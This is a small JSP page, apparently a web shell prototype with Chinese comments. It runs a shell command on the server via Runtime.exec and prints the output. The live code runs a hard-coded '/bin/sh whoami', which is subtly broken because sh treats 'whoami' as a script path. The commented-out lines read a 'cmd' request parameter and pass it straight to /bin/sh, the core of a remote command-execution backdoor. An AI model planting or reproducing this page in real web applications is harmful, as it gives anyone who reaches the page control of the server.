<%@ page import="java.io.BufferedReader"%><%@ page import="java.io.InputStreamReader"%><%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8"%>

<%
//    String cmd = request.getParameter("cmd");
//    String cmdAll = "/bin/sh " + cmd;
    String cmdAll = "/bin/sh whoami";
    Process proc = Runtime.getRuntime().exec(cmdAll);
    //获取脚本执行的得到的结果并缓存
    BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

    StringBuffer sb = new StringBuffer();
    String str;
    //读取数据
    while ((str = reader.readLine()) != null) {
        sb.append(str + "\n");
    }
    reader.close();
    proc.waitFor();
%>

<%="cmd:" + cmdAll%>

<%="out:" + (sb.toString().isEmpty() ? "empty" : sb.toString())%>
